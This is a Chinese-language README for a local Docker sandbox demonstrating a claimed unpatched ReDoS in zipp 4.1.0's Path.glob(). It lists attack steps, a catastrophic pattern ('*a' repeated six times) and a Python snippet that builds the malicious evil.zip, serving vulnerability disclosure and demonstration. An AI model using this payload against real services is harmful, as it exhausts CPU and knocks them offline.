# zipp ReDoS 沙箱

演示 zipp 4.1.0 最新版的 glob() ReDoS 0-day。

## 架构

```
浏览器 → Flask (gunicorn 4 worker) → zipfile → zipp.Path.glob(pattern)
                                              → CPU 100%
```

## 快速开始

```bash
# 构建 + 启动
docker compose up -d

# 观察 CPU
docker stats
```

## API

| 方法 | 路径 | 说明 |
|------|------|------|
| POST | /upload | 上传 ZIP (multipart/form-data) |
| GET | /glob?file=X&pattern=Y | 对 ZIP 执行 glob，返回耗时 + 匹配数 + CPU% |
| GET | /status | 当前 worker CPU% |
| GET | / | Web 页面 |

## 攻击演示

1. 打开 http://localhost:5000
2. 上传 `evil.zip`（含 a 前缀 entry 的 ZIP）
3. 输入 pattern `*a*a*a*a*a*a`（*a×6）
4. 点 Run → 观察 3s+ 延迟
5. 连续开 4 个 tab 全部点 Run → `docker stats` 看到 4 worker 全 100%

## 构造 evil.zip

```bash
python3 -c "
import zipfile, io
with zipfile.ZipFile('evil.zip', 'w') as zf:
    for i in range(100):
        zf.writestr(f\"{'a'*(i%50+1)}/file{i}.txt\", 'data')
    zf.writestr('a'*50, 'data')
"
```
